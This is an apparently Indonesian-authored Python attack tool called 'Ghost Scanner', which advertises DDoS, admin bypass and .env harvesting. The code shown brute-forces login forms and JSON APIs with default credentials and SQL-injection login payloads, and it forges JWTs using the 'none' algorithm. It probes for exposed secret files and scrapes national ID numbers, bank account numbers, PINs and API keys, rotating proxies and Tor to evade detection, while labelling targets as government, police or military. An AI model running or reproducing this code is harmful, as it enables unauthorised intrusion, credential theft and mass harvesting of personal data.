#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GHOST SCANNER v6.0 [BETA] - OMNI TOOLS X SAVAGE
- NO AI (removed completely)
- Full domain category (20+)
- Full region detection (IP geo + TLD + NIK + phone)
- .env full download + config files
- 50+ sensitive patterns
- Deep concurrent harvest
- Full PoC
- Real DDoS/DoS engine (http/syn/slow/ssl/udp)
- All functions self-contained, no missing defs
- NEW: Admin Bypass, Bot Checker, Stealth Mode
"""

import os, sys, time, json, re, random, base64, urllib.parse, socket, threading, ssl, subprocess, shutil, tempfile
from datetime import datetime
from urllib.parse import urljoin, quote, urlparse, parse_qs, urlsplit, urlunsplit, urlencode
from concurrent.futures import ThreadPoolExecutor, as_completed
import argparse, warnings
import requests
from rich.console import Console
from rich.panel import Panel
from rich.text import Text
from rich.progress import Progress, BarColumn, TextColumn, TimeElapsedColumn, TimeRemainingColumn, SpinnerColumn
from rich.table import Table
from rich import box
from fpdf import FPDF
warnings.filterwarnings('ignore')

# =====================================================# KONFIGURASI
# =====================================================PROXY_SOURCES = [
    'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text',
    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt',
    'https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt',
]

TOOLS_NAME = "Ghost Scanner"
TOOLS_BY = "GhostTeam"
TOOLS_GITHUB = "https://github.com/cozyleon00b-dev"
TOOLS_VERSION = "6.0 [BETA]"

# =====================================================# SKULL BANNER
# =====================================================SKULL_ART = r"""
              uuuuuuuuuuuuuuuu
           uu$$$$$$$$$$$$$$$$$$uu
          u$$$$$$$$$$$$$$$$$$$$$$u
         u$$$$$$$$$$$$$$$$$$$$$$$$u
         u$$$$$$$$$$$$$$$$$$$$$$$$u
         u$$$$$$"   "$$$"   "$$$$$$u
         "$$$"      u$u       "$$$"
          $$$u      u$u       u$$$
          $$$u      u$u       u$$$
           "$$$$uu$$$ $$$uu$$$$"
            "$$$$$$$" "$$$$$$$"
              u$$$$$$$u$$$$$$u
               u$"$"$"$"$"$"u
               $$u$u$u$u$u$u$
                $$$$$$$$$$$$
                 "$$$$$$$$"
"""

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
]

# =====================================================# BANNER / MENU / HELP
# =====================================================def show_banner():
    red = "\033[91m"; cyan = "\033[96m"; yellow = "\033[93m"
    white = "\033[97m"; green = "\033[92m"; magenta = "\033[95m"
    reset = "\033[0m"; bold = "\033[1m"
    skull = SKULL_ART.strip('\n').split('\n')
    side = [
        f"{cyan}{bold}GHOST SCANNER{reset}",
        f"{red}---------------------------------{reset}",
        f"{green}Nama Tools{reset}: {white}{TOOLS_NAME} v{TOOLS_VERSION}{reset}",
        f"{green}Mode      {reset}: {white}Main Menu{reset}",
        f"{green}Tools By  {reset}: {magenta}{TOOLS_BY}{reset}",
        f"{yellow}[{TOOLS_GITHUB}]{reset}",
        f"{red}---------------------------------{reset}",
        f"{cyan}{bold}KALI LINUX {reset}| {cyan}{bold}TERMUX {reset}| {cyan}{bold}HACKING{reset}",
        "",
        f"   {green}Fitur :{reset} {white}NO AI + Full PII + .env DL + 20+ Categories{reset}",
        f"   {red}═══════════════════════════════════════════════════════════════{reset}",
    ]
    max_lines = max(len(skull), len(side))
    for i in range(max_lines):
        left_vis = skull[i] if i < len(skull) else ""
        left = red + left_vis + reset
        right = side[i] if i < len(side) else ""
        padding = " " * max(0, 40 - len(left_vis))
        print(f"{left}{padding}{right}")
    print()

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def show_help():
    clear_screen()
    show_banner()
    Console().print(Panel(f"""
[bold cyan]USAGE:[/bold cyan]
  python ghostscanner.py -u <URL> [OPTIONS]

[bold yellow]SCAN:[/bold yellow]
  --scan                  Unified scan (recommended)
  --pdf                   Generate PDF report
  --quick                 Quick scan (fewer pages)
  --fast                  Fast mode (skip delay)
  --deep                  Deep scan (more pages)
  --force-admin           Force admin login bypass
  --tools                 Run external tools
  --stealth               Stealth mode (slower, less noise)
  --tor                   Use Tor proxy (default: 127.0.0.1:9050)
  --proxy-chain           Chain multiple proxies
  --delay N               Delay antar request (default 0.2s)
  --no-proxy              Disable proxy rotation
  --proxy-list FILE       Load proxies from file
  --validate-proxy        Validate proxies before use
  --threads N             Concurrent threads (default 50)

[bold yellow]ATTACK:[/bold yellow]
  --dos / --ddos / --syn / --slow / --ssl-reneg / --udp
  --threads N --duration N

[bold green]CONTOH:[/bold green]
  python ghostscanner.py -u https://target.com --scan --pdf --tools --fast
  python ghostscanner.py -u https://target.com --scan --pdf --deep --force-admin
  python ghostscanner.py -u https://your-server.com --slow --threads 200 --duration 30
  python ghostscanner.py -u https://target.com --scan --stealth --delay 2.0

[bold red]DISCLAIMER:[/bold red] Authorized testing only. DDoS = illegal.
""", border_style="cyan", title=f"[bold white]{TOOLS_NAME} v{TOOLS_VERSION}[/bold white]"))
    sys.exit(0)

def build_url(base, param, payload):
    return base + ('&' if '?' in base else '?') + param + '=' + quote(payload)

def is_tool_available(tool_name):
    return shutil.which(tool_name) is not None

# =====================================================# BOT CHECKER
# =====================================================class BotChecker:
    """Deteksi WAF, CDN, CAPTCHA, bot verification, rate limit."""
    
    WAF_SIGNATURES = {
        "Cloudflare": ["cf-ray", "cf-cache-status", "__cfduid", "cf_clearance"],
        "Akamai": ["akamai", "x-akamai", "akamai-grn", "x-akamai-transformed"],
        "Imperva": ["incap_ses", "visid_incap", "x-iinfo"],
        "Sucuri": ["x-sucuri-id", "x-sucuri-cache"],
        "AWS CloudFront": ["x-amz-cf-id", "x-amz-cf-pop"],
        "Fastly": ["fastly", "x-fastly-request-id"],
        "Varnish": ["x-varnish", "via"],
        "F5 BIG-IP": ["bigipserver", "ts"],
        "Barracuda": ["barra_counter_session"],
        "ModSecurity": ["mod_security", "modsecurity"],
    }
    
    CAPTCHA_SIGNATURES = [
        "g-recaptcha", "recaptcha", "hcaptcha", "cf-turnstile",
        "captcha", "challenge", "verify you are human",
        "just a moment", "checking your browser",
        "cf_chl_opt", "turnstile", "px-captcha",
    ]
    
    RATE_LIMIT_STATUS = [429, 503]
    RATE_LIMIT_HEADERS = ["retry-after", "x-ratelimit-limit", "x-ratelimit-remaining", "ratelimit-limit"]
    
    @staticmethod
    def detect_waf(headers):
        headers_lower = "\n".join(f"{k.lower()}: {str(v).lower()}" for k, v in headers.items())
        detected = []
        for name, keys in BotChecker.WAF_SIGNATURES.items():
            for k in keys:
                if k.lower() in headers_lower:
                    detected.append(name)
                    break
        return detected
    
    @staticmethod
    def detect_captcha(html, status_code):
        html_lower = (html or "").lower()
        if status_code in (403, 429, 503):
            for sig in BotChecker.CAPTCHA_SIGNATURES:
                if sig in html_lower:
                    return sig
        if "cf-chl" in html_lower or "challenge-platform" in html_lower:
            return "Cloudflare Challenge"
        if "g-recaptcha" in html_lower or "recaptcha" in html_lower:
            return "reCAPTCHA"
        if "hcaptcha" in html_lower:
            return "hCaptcha"
        if "turnstile" in html_lower:
            return "Cloudflare Turnstile"
        return None
    
    @staticmethod
    def detect_rate_limit(status_code, headers):
        if status_code in BotChecker.RATE_LIMIT_STATUS:
            return True
        for h in BotChecker.RATE_LIMIT_HEADERS:
            if h in [k.lower() for k in headers.keys()]:
                return True
        return False
    
    @staticmethod
    def full_check(response):
        """Return dict hasil deteksi."""
        headers = dict(response.headers) if hasattr(response, 'headers') else {}
        html = response.text if hasattr(response, 'text') else str(response)
        status = response.status_code if hasattr(response, 'status_code') else 0
        return {
            "waf": BotChecker.detect_waf(headers),
            "captcha": BotChecker.detect_captcha(html, status),
            "rate_limit": BotChecker.detect_rate_limit(status, headers),
            "status_code": status,
            "server": headers.get("Server", "Unknown"),
            "powered_by": headers.get("X-Powered-By", ""),
        }

# =====================================================# GHOST SCANNER CLASS
# =====================================================class GhostScanner:
    def __init__(self, target=None, use_proxy=True, proxy_file=None, validate_proxy=False,
                 quick=False, pdf=False, delay=0.2, force_admin=False,
                 use_tools=False, scan=False, fast=False, deep=False,
                 stealth=False, tor=False, proxy_chain=False):
        self.target = target
        self.use_proxy = use_proxy
        self.quick = quick
        self.pdf = pdf
        self.delay = delay
        self.force_admin = force_admin
        self.use_tools = use_tools
        self.scan = scan
        self.fast = fast
        self.deep = deep
        self.stealth = stealth
        self.tor = tor
        self.proxy_chain = proxy_chain
        self.version = TOOLS_VERSION
        self.start_time = time.time()
        
        # Stealth mode: slower, less detectable
        if stealth:
            self.delay = max(self.delay, 2.0)
            self.threads = 10
        else:
            self.threads = 50
            if fast:
                self.delay = 0.05
                self.threads = 100
        
        self.timeout = 20
        self.max_retries = 5
        self.common_ports = [21,22,23,25,53,80,110,135,139,143,443,445,993,995,
                             1723,3306,3389,5900,8080,8443]
        self.common_params = ['id','page','q','search','user','cat','product','view','sort',
                              'filter','name','email','phone','file','path','redirect','url',
                              'next','return','lang','region','type','mode','action','do','cmd',
                              'command','exec','query','sql','order','by','group','limit',
                              'offset','index','idx']
        
        self.result_folder = "results"
        self.sensitive_folder = "sensitive_data"
        self.download_folder = "downloads"
        os.makedirs(self.result_folder, exist_ok=True)
        os.makedirs(self.sensitive_folder, exist_ok=True)
        os.makedirs(self.download_folder, exist_ok=True)
        
        self.session = requests.Session()
        self.session.verify = False
        
        self.proxies = []
        self._load_proxies()
        
        self.results_scan = {
            "target": "", "domain": "", "domain_category": "",
            "timestamp": datetime.now().isoformat(),
            "bot_check": {},
            "summary": {"total": 0, "critical": 0, "high": 0, "medium": 0, "low": 0},
            "vulnerabilities": {k: [] for k in [
                "sql_injection", "xss", "command_injection", "ssti", "ldap_injection",
                "nosql_injection", "xxe", "ssrf", "path_traversal", "file_inclusion",
                "open_redirect", "csrf", "deserialization", "rce", "lfi", "rfi",
                "xss_context_aware", "xss_dom", "business_logic", "improper_input_validation",
                "mass_assignment", "rate_limit", "deface", "login_bypass",
                "wp_activity_log_rce", "admin_access", "admin_access_api",
                "robots", "sitemap", "dir_enum", "sensitive_files",
                "security_headers", "waf_detection", "cors", "open_redirect_sneijder",
                "ssl_info", "cookie_flags", "rate_limit_sneijder", "csrf_sneijder",
                "jwt_attack", "http_smuggling", "subdomain_takeover",
                "graphql_introspection", "oauth_bypass", "ddos_vulnerability",
                "nuclei", "ffuf", "sqlmap", "dalfox_external", "secretfinder",
                "interactsh", "nmap", "metasploit", "wireshark", "burpsuite",
                "user_scanner_osint"
            ]},
            "sensitive_data": {k: [] for k in [
                "nik", "npwp", "nip", "no_rekening", "bank", "emails", "phones",
                "whatsapp", "pin", "ktp_links", "kk_links", "surat_izin_links",
                "pdf_links", "province_codes", "kabupaten_codes", "kecamatan_codes",
                "api_keys", "jwt_tokens", "aws_keys", "azure_keys", "gcp_keys",
                "source_code"
            ]},
            "external": {"subdomains": [], "dns_records": [], "live_hosts": [],
                         "naabu_ports": [], "katana_urls": [], "historical_urls": [],
                         "arjun_params": []},
            "ports": [], "scan_duration": 0, "validated": False,
            "sensitive_pdfs": [], "downloaded_docs": []
        }
    
    # ---------- PROXY ----------
    def _load_proxies(self):
        if not self.use_proxy:
            return
        if self.tor:
            self.proxies.append({'http': 'socks5://127.0.0.1:9050', 'https': 'socks5://127.0.0.1:9050'})
            Console().print("[cyan]Tor proxy enabled (127.0.0.1:9050)[/cyan]")
            return
        if self.proxy_file and os.path.exists(self.proxy_file):
            try:
                with open(self.proxy_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            if not line.startswith(('http://','https://','socks')):
                                line = 'http://' + line
                            self.proxies.append({'http': line, 'https': line})
            except Exception:
                pass
        try:
            resp = requests.get(PROXY_SOURCES[0], timeout=15)
            if resp.status_code == 200:
                for p in resp.text.strip().split('\n'):
                    p = p.strip()
                    if p:
                        if not p.startswith(('http://','https://','socks')):
                            p = 'http://' + p
                        self.proxies.append({'http': p, 'https': p})
        except Exception:
            pass
        seen = set()
        uniq = []
        for proxy in self.proxies:
            k = proxy.get('http', '')
            if k and k not in seen:
                seen.add(k)
                uniq.append(proxy)
        self.proxies = uniq
        if self.proxies:
            Console().print(f"[green]Loaded {len(self.proxies)} proxies.[/green]")
    
    def _get_random_proxy(self):
        if not self.proxies:
            return None
        if self.proxy_chain and len(self.proxies) >= 2:
            return random.sample(self.proxies, 2)[0]
        return random.choice(self.proxies)
    
    def _adaptive_delay(self, response_time=0):
        now = time.time()
        elapsed = now - getattr(self, '_last_request_time', 0)
        if self.stealth:
            sleep = random.uniform(2.0, 5.0)
        elif response_time > 3:
            sleep = random.uniform(2, 4)
        elif response_time > 1:
            sleep = random.uniform(0.8, 1.5)
        else:
            sleep = random.uniform(0.2, 0.6)
        if elapsed < sleep:
            time.sleep(sleep - elapsed)
        self._last_request_time = time.time()
    
    # ---------- SMART REQUEST ----------
    def _smart_request(self, url, timeout=None, method='GET', data=None, headers=None,
                       allow_redirects=True):
        if timeout is None:
            timeout = self.timeout
        full_headers = {
            'User-Agent': random.choice(USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9,id;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
        }
        if method.upper() == 'POST':
            p = urlparse(url)
            full_headers['Origin'] = f"{p.scheme}://{p.netloc}"
            full_headers['Referer'] = url
        if headers:
            full_headers.update(headers)
        proxy = self._get_random_proxy() if self.proxies else None
        
        for attempt in range(self.max_retries):
            try:
                start = time.time()
                if method.upper() == 'GET':
                    resp = self.session.get(url, headers=full_headers, timeout=timeout,
                                            allow_redirects=allow_redirects, proxies=proxy)
                elif method.upper() == 'POST':
                    resp = self.session.post(url, data=data, headers=full_headers,
                                             timeout=timeout, allow_redirects=allow_redirects,
                                             proxies=proxy)
                else:
                    resp = self.session.request(method, url, data=data, headers=full_headers,
                                                 timeout=timeout, allow_redirects=allow_redirects,
                                                 proxies=proxy)
                self._adaptive_delay(time.time() - start)
                return resp
            except Exception:
                time.sleep(2 ** attempt)
        return None
    
    # ---------- BOT CHECK ----------
    def _run_bot_check(self, target):
        """Deteksi WAF, CAPTCHA, rate limit, bot verification."""
        Console().print("[cyan]🔍 Bot Checker...[/cyan]")
        resp = self._smart_request(target, timeout=15)
        if not resp:
            Console().print("[yellow]Target unreachable for bot check[/yellow]")
            return {}
        check = BotChecker.full_check(resp)
        self.results_scan["bot_check"] = check
        
        if check["waf"]:
            Console().print(f"[bold red]⚠ WAF Detected: {', '.join(check['waf'])}[/bold red]")
        if check["captcha"]:
            Console().print(f"[bold red]⚠ CAPTCHA/Bot Verification: {check['captcha']}[/bold red]")
        if check["rate_limit"]:
            Console().print(f"[bold yellow]⚠ Rate Limit Detected[/bold yellow]")
        if not any([check["waf"], check["captcha"], check["rate_limit"]]):
            Console().print("[green]✓ No protection detected[/green]")
        
        return check
    
    # ---------- ADMIN BYPASS ----------
    def _admin_bypass_form(self, base, forms):
        """Brute force login form + SQL injection bypass."""
        pocs = []
        creds = [
            ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
            ("admin", "123456"), ("admin", "12345678"), ("administrator", "administrator"),
            ("root", "root"), ("root", "toor"), ("root", "password"),
            ("admin@admin.com", "admin"), ("test", "test"), ("guest", "guest"),
            ("admin' -- ", "x"), ("admin' OR '1'='1' -- ", "x"),
            ("' OR 1=1 -- ", "' OR 1=1 -- "), ("admin' OR 1=1#", "x"),
        ]
        
        for form in forms:
            inputs = form.get("inputs", [])
            if not any(i.get("type", "").lower() == "password" for i in inputs):
                continue
            action = form["url"]
            method = form.get("method", "POST")
            uf = next((i["name"] for i in inputs
                       if any(x in i["name"].lower() for x in ["user", "email", "login", "name"])), None)
            pf = next((i["name"] for i in inputs
                       if any(x in i["name"].lower() for x in ["pass", "pwd", "secret"])), None)
            if not uf or not pf:
                continue
            extra = {i["name"]: "x" for i in inputs
                     if i["name"] not in (uf, pf) and i.get("type") != "hidden"}
            
            for user, pwd in creds:
                payload = {uf: user, pf: pwd, **extra}
                resp = self._smart_request(action, timeout=10, method=method, data=payload)
                if not resp:
                    continue
                body_low = (resp.text or "").lower()
                hit = (resp.status_code in (301, 302, 303)
                       or any(t in body_low for t in
                              ["dashboard", "logout", "welcome", "profile",
                               "sign out", "keluar", "beranda",
                               "admin panel", "control panel"]))
                if hit:
                    curl = (f'curl -k -X {method} "{action}" '
                            f'-d "{urlencode(payload)}" -c cookies.txt -b cookies.txt -i')
                    pocs.append({
                        "url": action, "method": method,
                        "credentials": {"user_field": uf, "pass_field": pf,
                                         "user": user, "pass": pwd},
                        "redirect": resp.headers.get("Location", ""),
                        "status": resp.status_code,
                        "body_snippet": (resp.text or "")[:600],
                        "curl": curl, "verified": True
                    })
                    Console().print(f"[bold green]✓ ADMIN FORM BYPASS: {uf}={user!r} → {action} ({resp.status_code})[/bold green]")
                    break
        return pocs
    
    def _admin_bypass_api(self, base, endpoints):
        """Brute force API JSON login + JWT none attack."""
        pocs = []
        creds = [
            {"username": "admin", "password": "admin"},
            {"username": "admin", "password": "password"},
            {"username": "admin", "password": "admin123"},
            {"username": "admin", "password": "123456"},
            {"username": "administrator", "password": "administrator"},
            {"username": "root", "password": "root"},
            {"email": "admin@admin.com", "password": "admin"},
            {"user": "admin", "pass": "admin"},
            {"username": "admin' OR '1'='1' -- ", "password": "x"},
            {"username": "admin'--", "password": "x"},
            {"email": "admin' OR 1=1--", "password": "x"},
            {"user": "' OR 1=1#", "pass": "x"},
        ]
        
        for ep in endpoints[:10]:
            for body in creds:
                try:
                    r = self._smart_request(ep, timeout=8, method="POST",
                                            data=json.dumps(body),
                                            headers={"Content-Type": "application/json"})
                    if not r:
                        continue
                    tl = (r.text or "").lower()
                    hit = (r.status_code == 200 and any(k in tl for k in
                           ["token", "access_token", "jwt", "session",
                            "authenticated", "success\":true", "\"role\":\"admin\""]))
                    if hit:
                        curl = (f'curl -k -X POST "{ep}" '
                                f'-H "Content-Type: application/json" -d \'{json.dumps(body)}\'')
                        pocs.append({
                            "endpoint": ep, "method": "POST", "body": body,
                            "status": r.status_code,
                            "response": (r.text or "")[:600],
                            "curl": curl, "verified": True
                        })
                        Console().print(f"[bold green]✓ ADMIN API BYPASS: {ep} {body}[/bold green]")
                        break
                except Exception:
                    continue
        return pocs
    
    def _admin_bypass_jwt(self, target):
        """JWT none algorithm attack."""
        pocs = []
        try:
            resp = self._smart_request(target, timeout=8)
            if not resp:
                return pocs
            jwt_pattern = r'eyJ[A-Za-z0-9_\-]+\.eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+'
            tokens = re.findall(jwt_pattern, resp.text or "")
            cookies = resp.headers.get('Set-Cookie', '')
            tokens += re.findall(jwt_pattern, cookies)
            
            for t in set(tokens[:3]):
                none_header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip('=')
                none_payload = base64.urlsafe_b64encode(b'{"admin":true,"role":"admin"}').decode().rstrip('=')
                none_jwt = f"{none_header}.{none_payload}."
                
                # Test endpoint with none JWT
                for ep in ["/api/me", "/api/user", "/api/profile", "/api/admin", "/admin"]:
                    try:
                        url = target.rstrip('/') + ep
                        r = self._smart_request(url, timeout=8,
                                                headers={"Authorization": f"Bearer {none_jwt}"})
                        if r and r.status_code == 200:
                            pocs.append({
                                "type": "JWT None Algorithm",
                                "endpoint": url,
                                "original_jwt": t[:50] + "...",
                                "forged_jwt": none_jwt[:80] + "...",
                                "status": r.status_code,
                                "response": (r.text or "")[:400],
                                "curl": f'curl -k -H "Authorization: Bearer {none_jwt}" "{url}"',
                                "verified": True
                            })
                            Console().print(f"[bold red]✓ JWT NONE BYPASS: {url}[/bold red]")
                            break
                    except Exception:
                        continue
        except Exception:
            pass
        return pocs
    
    def _detect_spa_login(self, html, base):
        """Deteksi endpoint login SPA/API."""
        endpoints = set()
        for pat in [r'["\'](/[^"\']*(?:login|signin|auth|session|token)[^"\']*)["\']',
                    r'["\'](https?://[^"\']*(?:login|signin|auth)[^"\']*)["\']']:
            for m in re.findall(pat, html or "", re.I):
                u = urljoin(base, m)
                if urlparse(u).netloc == urlparse(base).netloc:
                    endpoints.add(u)
        for p in ["/api/login", "/api/auth/login", "/api/v1/login", "/auth/login",
                  "/api/session", "/api/token", "/wp-json/jwt-auth/v1/token",
                  "/api/users/login", "/login", "/signin"]:
            endpoints.add(base.rstrip("/") + p)
        return list(endpoints)
    
    def _run_admin_bypass(self, target, html):
        """Full admin bypass: form + API + JWT."""
        Console().print("[bold magenta]═══ ADMIN BYPASS ═══[/bold magenta]")
        all_pocs = []
        
        # Form-based
        forms = self._extract_forms(html, target)
        form_pocs = self._admin_bypass_form(target, forms)
        all_pocs.extend(form_pocs)
        
        # API-based
        endpoints = self._detect_spa_login(html, target)
        api_pocs = self._admin_bypass_api(target, endpoints)
        all_pocs.extend(api_pocs)
        
        # JWT-based
        jwt_pocs = self._admin_bypass_jwt(target)
        all_pocs.extend(jwt_pocs)
        
        self.results_scan["vulnerabilities"]["admin_access"] = form_pocs
        self.results_scan["vulnerabilities"]["admin_access_api"] = api_pocs
        self.results_scan["vulnerabilities"]["login_bypass"] = [
            p for p in form_pocs if "'" in p.get("credentials", {}).get("user", "")
        ]
        self.results_scan["vulnerabilities"]["jwt_attack"] = jwt_pocs
        
        if all_pocs:
            Console().print(f"[bold green]✓ Total admin bypass: {len(all_pocs)}[/bold green]")
        else:
            Console().print("[yellow]No admin bypass found[/yellow]")
        
        return all_pocs
    
    # ---------- EXTRACTION ----------
    def _extract_params_from_url(self, url):
        params = {}
        p = urlparse(url)
        if p.query:
            for kv in p.query.split('&'):
                if '=' in kv:
                    k, v = kv.split('=', 1)
                    params[k] = v
        return params
    
    def _extract_forms(self, html, base_url):
        forms = []
        for form in re.findall(r'<form[^>]*>(.*?)</form>', html, re.I | re.S):
            m = re.search(r'method=["\'](.*?)["\']', form, re.I)
            method = m.group(1).upper() if m else 'GET'
            a = re.search(r'action=["\'](.*?)["\']', form, re.I)
            action = a.group(1) if a else ''
            action_url = urljoin(base_url, action) if action else base_url
            inputs = []
            for inp in re.findall(r'<input[^>]*>', form, re.I):
                n = re.search(r'name=["\'](.*?)["\']', inp, re.I)
                t = re.search(r'type=["\'](.*?)["\']', inp, re.I)
                if n:
                    inputs.append({'name': n.group(1), 'type': t.group(1) if t else 'text'})
            if inputs:
                forms.append({'method': method, 'url': action_url, 'inputs': inputs})
        return forms
    
    def _extract_sensitive_data(self, text):
        data = {k: [] for k in self.results_scan["sensitive_data"].keys()}
        if not text:
            return data
        for nik in set(re.findall(r'\b[0-9]{16}\b', text)):
            data["nik"].append(nik)
            if len(nik) >= 6:
                for code, k in [(nik[:2],"province_codes"),(nik[2:4],"kabupaten_codes"),(nik[4:6],"kecamatan_codes")]:
                    if code not in data[k]:
                        data[k].append(code)
        data["npwp"] = list(set(re.findall(r'\b[0-9]{15}\b', text)))
        data["nip"] = list(set(re.findall(r'\b[0-9]{18}\b', text)))
        data["no_rekening"] = list(set(re.findall(r'\b[0-9]{10,16}\b', text)))
        for bank in ['bca','mandiri','bni','bri','btn','cimb']:
            if bank in text.lower():
                data["bank"].append(bank.upper())
        data["emails"] = list(set(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', text)))
        data["phones"] = list(set(m.group(0) for m in re.finditer(r'(\+62|0)[0-9]{9,13}', text)))
        data["whatsapp"] = [p for p in data["phones"] if 'wa' in text[max(0,text.find(p)-20):text.find(p)+20].lower()]
        for m in re.finditer(r'pin\s*[:=]?\s*([0-9]{4,6})', text, re.I):
            data["pin"].append(m.group(1))
        data["pdf_links"] = list(set(re.findall(r'href=["\']([^"\']+\.pdf)["\']', text, re.I)))
        for link in data["pdf_links"]:
            if 'ktp' in link.lower() or 'nik' in link.lower():
                data["ktp_links"].append(link)
            if 'kk' in link.lower():
                data["kk_links"].append(link)
            if 'izin' in link.lower():
                data["surat_izin_links"].append(link)
        api_keys = []
        for pat in [r'sk-[a-zA-Z0-9]{32,}', r'AIza[0-9A-Za-z-_]{35}', r'ghp_[a-zA-Z0-9]{36}', r'AKIA[0-9A-Z]{16}']:
            api_keys.extend(re.findall(pat, text))
        data["api_keys"] = list(set(api_keys))
        data["jwt_tokens"] = [m for m in api_keys if '.' in m and len(m.split('.')) == 3]
        data["source_code"] = [m[:500] for m in re.findall(r'(?:<script>|<style>)(.*?)(?:</script>|</style>)', text, re.I | re.S) if len(m) > 20][:10]
        return data
    
    def _classify_domain(self, domain):
        d = domain.lower()
        if d.endswith('.go.id') or '.gov' in d:
            return 'Government'
        if d.endswith('.ac.id') or d.endswith('.sch.id') or d.endswith('.edu'):
            return 'Education'
        if 'polri.go.id' in d or 'police' in d:
            return 'Police'
        if d.endswith('.mil.id') or 'tni' in d:
            return 'Military'
        if any(x in d for x in ['rs','klinik','hospital','medis']):
            return 'Medical'
        if any(d.endswith(x) for x in ['.com','.co.id','.my.id','.net','.biz']):
            return 'Business'
        return 'Other'
    
    # ---------- SCAN MODULES ----------
    def _check_robots(self, target):
        findings = []
        try:
            url = target.rstrip('/') + '/robots.txt'
            resp = self._smart_request(url, timeout=8)
            if resp and resp.status_code == 200 and 'Disallow' in resp.text:
                dis = re.findall(r'Disallow:\s*(\S+)', resp.text)[:10]
                findings.append({
                    "type": "Robots.txt Found", "param": "N/A", "payload": "N/A",
                    "evidence": f"Disallowed: {', '.join(dis)}", "risk": "LOW", "confidence": 90,
                    "poc": {"url": url, "curl": f"curl -k \"{url}\"",
                             "response": resp.text[:500], "statusCode": resp.status_code,
                             "timeDiff": "N/A", "verified": True}
                })
        except Exception:
            pass
        return findings
    
    def _check_sensitive_files(self, target):
        findings = []
        files = ["/.env","/.git/config","/backup.zip","/db.sql","/config.php.bak","/phpinfo.php","/.htaccess"]
        base = target.rstrip('/')
        for f in files:
            try:
                url = base + f
                resp = self._smart_request(url, timeout=6)
                if resp and resp.status_code == 200 and len(resp.content) > 50:
                    findings.append({
                        "type": f"Sensitive File: {f}", "param": "N/A", "payload": "N/A",
                        "evidence": f"Accessible | {len(resp.content)} bytes",
                        "risk": "CRITICAL", "confidence": 95,
                        "poc": {"url": url, "curl": f"curl -k \"{url}\"",
                                 "response": resp.text[:300], "statusCode": resp.status_code,
                                 "timeDiff": "N/A", "verified": True}
                    })
            except Exception:
                continue
        return findings
    
    def _check_security_headers(self, target):
        findings = []
        required = ["Strict-Transport-Security","Content-Security-Policy","X-Frame-Options",
                    "X-Content-Type-Options","Referrer-Policy","Permissions-Policy"]
        resp = self._smart_request(target, timeout=8)
        if not resp:
            return findings
        missing = [h for h in required if h not in resp.headers]
        if missing:
            findings.append({
                "type": "Missing Security Headers", "param": "N/A", "payload": "N/A",
                "evidence": f"Missing: {', '.join(missing)}", "risk": "LOW", "confidence": 90,
                "poc": {"url": target, "curl": f"curl -I \"{target}\"",
                         "response": str(resp.headers), "statusCode": resp.status_code,
                         "timeDiff": "N/A", "verified": True}
            })
        return findings
    
    def _check_waf(self, target):
        findings = []
        resp = self._smart_request(target, timeout=8)
        if not resp:
            return findings
        waf_signs = [("Cloudflare",["cf-ray"]),("Akamai",["akamai","x-akamai","akamai-grn"]),
                     ("Sucuri",["x-sucuri-id"]),("Imperva",["incap_ses"]),
                     ("Fastly",["fastly"]),("Varnish",["x-varnish"]),
                     ("AWS/CloudFront",["x-amz-cf-id"])]
        hlower = "\n".join([f"{k.lower()}: {str(v).lower()}" for k, v in resp.headers.items()])
        detected = []
        for name, keys in waf_signs:
            for k in keys:
                if k.lower() in hlower:
                    detected.append(name)
                    break
        if detected:
            findings.append({
                "type": "WAF/CDN Detected", "param": "N/A", "payload": "N/A",
                "evidence": f"Detected: {', '.join(detected)}", "risk": "INFO", "confidence": 95,
                "poc": {"url": target, "curl": f"curl -I \"{target}\"",
                         "response": str(resp.headers), "statusCode": resp.status_code,
                         "timeDiff": "N/A", "verified": True}
            })
        return findings
    
    def _check_deface(self, target):
        findings = []
        try:
            resp = self._smart_request(target, timeout=8)
            if not resp:
                return findings
            html_lower = resp.text.lower()
            indicators = ['hacked','defaced','hacked by','owned by','h4ck3d','pwned','0wn3d','cyber army']
            found = [i for i in indicators if i in html_lower]
            if found:
                findings.append({
                    "type": "Deface Detection", "param": "N/A", "payload": "N/A",
                    "evidence": f"Indicators: {', '.join(found)}",
                    "risk": "CRITICAL", "confidence": 95,
                    "poc": {"url": target, "curl": f"curl -k \"{target}\"",
                             "response": resp.text[:500], "statusCode": resp.status_code,
                             "timeDiff": "N/A", "verified": True}
                })
        except Exception:
            pass
        return findings
    
